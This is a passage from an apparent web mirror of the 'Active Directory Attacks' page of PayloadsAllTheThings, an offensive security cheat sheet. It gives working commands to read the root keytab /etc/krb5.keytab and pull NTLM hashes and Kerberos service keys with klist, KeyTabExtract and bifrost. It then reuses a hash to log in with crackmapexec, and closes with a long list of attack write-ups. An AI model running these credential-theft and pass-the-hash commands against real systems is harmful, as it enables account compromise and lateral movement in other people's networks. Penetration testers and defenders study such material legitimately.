</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Successful</span><span class="w"> </span><span class="nx">injection</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">25820</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">trex</span><span class="p">[</span><span class="mi">1120601113</span><span class="p">],</span><span class="nx">look</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">tickets</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">/tmp/__krb_1120601113.ccache</span><span class="w">
</span><span class="p">[</span><span class="n">X</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">uid</span><span class="p">:</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="n">Error</span><span class="w"> </span><span class="n">retrieving</span><span class="w"> </span><span class="n">tickets</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="ccache-ticket-reuse-from-keytab">CCACHE ticket reuse from keytab</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/its-a-feature/KeytabParser</span><span class="w">
</span><span class="n">python</span><span class="w"> </span><span class="nx">KeytabParser.py</span><span class="w"> </span><span class="nx">/etc/krb5.keytab</span><span class="w">
</span><span class="n">klist</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nx">/etc/krb5.keytab</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="extract-accounts-from-etckrb5keytab">Extract accounts from /etc/krb5.keytab</h3>

<p>The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service’s password, and must be kept secure.</p>

<p>Use <a href="https://adoptopenjdk.net/?variant=openjdk13&amp;jvmVariant=hotspot"><code class="language-plaintext highlighter-rouge">klist</code></a> to read the keytab file and parse its content. The key that you see when the <a href="https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey">key type</a> is 23  is the actual NT Hash of the user.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">klist.exe</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nt">-K</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nx">FILE:C:\Users\User\downloads\krb5.keytab</span><span class="w">
</span><span class="p">[</span><span class="o">...</span><span class="p">]</span><span class="w">
</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span><span class="w"> </span><span class="n">Service</span><span class="w"> </span><span class="nx">principal:</span><span class="w"> </span><span class="nx">host/COMPUTER</span><span class="err">@</span><span class="nx">DOMAIN</span><span class="w">
	 </span><span class="n">KVNO:</span><span class="w"> </span><span class="nx">25</span><span class="w">
	 </span><span class="n">Key</span><span class="w"> </span><span class="nx">type:</span><span class="w"> </span><span class="nx">23</span><span class="w">
	 </span><span class="n">Key:</span><span class="w"> </span><span class="nx">31d6cfe0d16ae931b73c59d7e0c089c0</span><span class="w">
	 </span><span class="n">Time</span><span class="w"> </span><span class="nx">stamp:</span><span class="w"> </span><span class="nx">Oct</span><span class="w"> </span><span class="nx">07</span><span class="p">,</span><span class="w">  </span><span class="nx">2019</span><span class="w"> </span><span class="nx">09:12:02</span><span class="w">
</span><span class="p">[</span><span class="o">...</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>On Linux you can use <a href="https://github.com/sosdave/KeyTabExtract"><code class="language-plaintext highlighter-rouge">KeyTabExtract</code></a>: we want RC4 HMAC hash to reuse the NLTM hash.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="nx">keytabextract.py</span><span class="w"> </span><span class="nx">krb5.keytab</span><span class="w"> 
</span><span class="p">[</span><span class="o">!</span><span class="p">]</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="nx">RC4-HMAC</span><span class="w"> </span><span class="nx">located.</span><span class="w"> </span><span class="nx">Unable</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">extract</span><span class="w"> </span><span class="nx">NTLM</span><span class="w"> </span><span class="nx">hashes.</span><span class="w"> </span><span class="c"># No luck</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Keytab</span><span class="w"> </span><span class="nx">File</span><span class="w"> </span><span class="nx">successfully</span><span class="w"> </span><span class="nx">imported.</span><span class="w">
        </span><span class="n">REALM</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">DOMAIN</span><span class="w">
        </span><span class="n">SERVICE</span><span class="w"> </span><span class="nx">PRINCIPAL</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">host/computer.domain</span><span class="w">
        </span><span class="n">NTLM</span><span class="w"> </span><span class="nx">HASH</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">31d6cfe0d16ae931b73c59d7e0c089c0</span><span class="w"> </span><span class="c"># Lucky</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>On macOS you can use <code class="language-plaintext highlighter-rouge">bifrost</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="o">.</span><span class="n">/bifrost</span><span class="w"> </span><span class="nt">-action</span><span class="w"> </span><span class="nx">dump</span><span class="w"> </span><span class="nt">-source</span><span class="w"> </span><span class="nx">keytab</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">test</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Connect to the machine using the account and the hash with CME.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">crackmapexec</span><span class="w"> </span><span class="nx">10.XXX.XXX.XXX</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s1">'COMPUTER$'</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="s2">"31d6cfe0d16ae931b73c59d7e0c089c0"</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="s2">"DOMAIN"</span><span class="w">
</span><span class="n">CME</span><span class="w">          </span><span class="nx">10.XXX.XXX.XXX:445</span><span class="w"> </span><span class="nx">HOSTNAME-01</span><span class="w">   </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nx">DOMAIN\COMPUTER</span><span class="err">$</span><span class="w"> </span><span class="nx">31d6cfe0d16ae931b73c59d7e0c089c0</span><span class="w">  
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://www.roguelynn.com/words/explain-like-im-5-kerberos/">Explain like I’m 5: Kerberos - Apr 2, 2013 - @roguelynn</a></li>
  <li><a href="#https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/">Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter</a></li>
  <li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin">Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema</a></li>
  <li><a href="https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf">Abusing Kerberos: Kerberoasting - Haboob Team</a></li>
  <li><a href="https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence">Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid</a></li>
  <li><a href="https://blog.netspi.com/attacks-against-windows-pxe-boot-images/">Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling</a></li>
  <li><a href="https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/">BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 &amp; @5ub34x</a></li>
  <li><a href="https://chryzsh.gitbooks.io/darthsidious/content/building-a-lab/building-a-lab/building-a-small-lab.html">Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh</a></li>
  <li><a href="https://microsoftrnd.co.il/Press%20Kit/BlueHat%20IL%20Decks/BenjaminDelpy.pdf">BlueHat IL - Benjamin Delpy</a></li>
  <li><a href="https://connect.ed-diamond.com/MISC/MISC-103/Compromission-des-postes-de-travail-grace-a-LAPS-et-PXE">COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger </a></li>
  <li><a href="https://github.com/l0ss/Chump2Trump/blob/master/ChumpToTrump.pdf">Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss</a></li>
  <li><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/">DiskShadow The return of VSS Evasion Persistence and AD DB extraction</a></li>
  <li><a href="https://hausec.com/2017/10/21/domain-penetration-testing-using-bloodhound-crackmapexec-mimikatz-to-get-domain-admin/">Domain Penetration Testing: Using BloodHound, Crackmapexec, &amp; Mimikatz to get Domain Admin</a></li>
  <li><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/">Dumping Domain Password Hashes - Pentestlab</a></li>
  <li><a href="https://zachgrace.com/posts/exploiting-ms14-068/">Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace</a></li>
  <li><a href="https://chryzsh.github.io/exploiting-privexchange/">Exploiting PrivExchange - April 11, 2019 - @chryzsh</a></li>
  <li><a href="https://www.riccardoancarani.it/exploiting-unconstrained-delegation/">Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019</a></li>
  <li><a href="https://adsecurity.org/?p=2288">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</a></li>
  <li><a href="https://adsecurity.org/?p=2011">How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf</a></li>
  <li><a href="https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments">Fun with LDAP, Kerberos (and MSRPC) in AD Environments</a></li>
  <li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html">Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r</a></li>
  <li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html">Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r</a></li>
  <li><a href="https://pentestlab.blog/2018/04/09/golden-ticket/">Golden ticket - Pentestlab</a></li>
  <li><a href="https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/">How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff</a></li>
  <li><a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts - Roberto Rodriguez - Nov 28, 2018</a></li>
  <li><a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/">Invoke-Kerberoast - Powersploit Read the docs</a></li>
  <li><a href="https://room362.com/post/2016/kerberoast-pt1/">Kerberoasting - Part 1 - Mubix “Rob” Fuller</a></li>
  <li><a href="https://michael-eder.net/post/2018/native_rdp_pass_the_hash/">Passing the hash with native RDP client (mstsc.exe)</a></li>
  <li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/">Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView)</a></li>
  <li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-ii-getting-stuff-done-with-powerview/">Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView</a></li>
  <li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-iii-chasing-power-users/">Pen Testing Active Directory Environments - Part III:  Chasing Power Users</a></li>
  <li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-iv-graph-fun/">Pen Testing Active Directory Environments - Part IV: Graph Fun</a></li>
  <li><a href="https://blog.varonis.com/pen-testing-active-directory-v-admins-graphs/">Pen Testing Active Directory Environments - Part V: Admins and Graphs</a></li>
  <li><a href="https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/">Pen Testing Active Directory Environments - Part VI: The Final Case</a></li>
  <li><a href="https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/">Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec</a></li>
  <li><a href="https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/">Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec</a></li>
  <li><a href="https://0metasecurity.com/post-oscp-part-2/">Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman</a></li>
  <li><a href="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/">Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith</a></li>
  <li><a href="http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html">Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave</a></li>
  <li><a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">Roasting AS-REPs - January 17, 2017 - harmj0y</a></li>
  <li><a href="https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa">Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher</a></li>
  <li><a href="https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/">Using bloodhound to map the user network - Hausec</a></li>
  <li><a href="https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/">WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN</a></li>
  <li><a href="https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 1</a></li>
  <li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 2</a></li>
  <li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 3</a></li>
  <li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 4</a></li>
  <li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 5</a></li>
  <li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami</a></li>
  <li><a href="http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/">[PrivExchange] From user to domain admin in less than 60sec ! - davy</a></li>
  <li><a href="http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y</a></li>
  <li><a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ</a></li>
  <li><a href="https://adsecurity.org/?p=3592">Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory -  Sean Metcalf</a></li>
  <li><a href="https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/">All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018</a></li>
  <li><a href="https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-slides.pdf">Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon</a></li>
  <li><a href="https://www.secureauth.com/blog/playing-relayed-credentials">Playing with Relayed Credentials - June 27, 2018</a></li>
  <li><a href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema</a></li>
  <li><a href="https://blog.preempt.com/drop-the-mic">Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019</a></li>
  <li><a href="https:/www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/">How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous</a></li>
  <li><a href="pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX</a></li>
  <li><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema</a></li>
  <li><a href="https://wald0.com/?p=179">A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0</a></li>
  <li><a href="https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0">Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf</a></li>
  <li><a href="https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61">Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10</a></li>
  <li><a href="https://github.com/buftas/Active-Directory-Exploitation-Cheat-Sheet#local-privilege-escalation">Active-Directory-Exploitation-Cheat-Sheet - @buftas</a></li>
  <li><a href="https://rastamouse.me/2019/01/gpo-abuse-part-1/">GPO Abuse - Part 1 - RastaMouse - 6 January 2019</a></li>
  <li><a href="https://rastamouse.me/2019/01/gpo-abuse-part-2/">GPO Abuse - Part 2 - RastaMouse - 13 January 2019</a></li>
  <li><a href="https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/">Abusing GPO Permissions - harmj0y - March 17, 2016</a></li>
  <li><a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html">How To Attack Kerberos 101 - m0chan - July 31, 2019</a></li>
  <li><a href="https://sensepost.com/blog/2020/ace-to-rce/">ACE to RCE - @JustinPerdok - July 24, 2020</a></li>
  <li><a href="https://www.secura.com/pathtoimg.php?id=2055">Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020</a></li>
  <li><a href="https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces">Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs</a></li>
  <li><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/">CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation - Jake Karnes - December 8th, 2020</a></li>
  <li><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020</a></li>
  <li><a href="https://www.hub.trimarcsecurity.com/post/leveraging-the-kerberos-bronze-bit-attack-cve-2020-17049-scenarios-to-compromise-active-directory">Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory</a></li>
  <li><a href="https://pentestmag.com/gpo-abuse-you-cant-see-me/">GPO Abuse: “You can’t see me” - Huy Kha -  July 19, 2019</a></li>
  <li><a href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/">Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017</a></li>
  <li><a href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques">New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018</a></li>
</ul>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/methodology-and-resource/'>Methodology and Resource</a>,
            <a href='/categories/attacks/'>Attacks</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/attacks/"
            class="post-tag no-text-decoration" >Attacks</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Active Directory Attacks - PayloadsAllTheThings&url=http://localhost:4000/Active-Directory-Attacks/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Active Directory Attacks - PayloadsAllTheThings&u=http://localhost:4000/Active-Directory-Attacks/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Active Directory Attacks - PayloadsAllTheThings&url=http://localhost:4000/Active-Directory-Attacks/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
